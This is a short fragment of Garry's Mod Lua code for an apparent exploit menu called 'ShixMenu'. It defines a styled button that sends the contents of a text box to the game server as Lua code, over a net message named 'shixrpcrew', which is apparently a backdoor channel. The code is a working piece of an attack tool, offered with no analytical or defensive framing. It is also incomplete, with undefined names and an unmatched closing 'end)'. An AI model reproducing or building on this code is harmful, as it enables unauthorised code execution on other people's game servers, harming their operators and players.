GLUA:SetText("Code LUA")
GLUA:SetTextColor(Color(255, 255, 255, 255))
GLUA.Paint = function(panel, w, h)
    surface.SetDrawColor(29, 39, 55)
    surface.DrawRect( 0, 0, GLUA:GetWide(), GLUA:GetTall() )
    surface.SetDrawColor( 149, 44, 87 )
    surface.DrawOutlinedRect( 0, 0, GLUA:GetWide(), GLUA:GetTall() )
end

GLUA.DoClick = function()
local GetEntry = Entry:GetValue()
        net.Start(shixrpcrew)
        net.WriteString( GetEntry )
        net.WriteBit (1)
        net.SendToServer()
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "ShixMenu", "] ", Color( 255, 255, 255 ), "Lua code sent." )
end

end)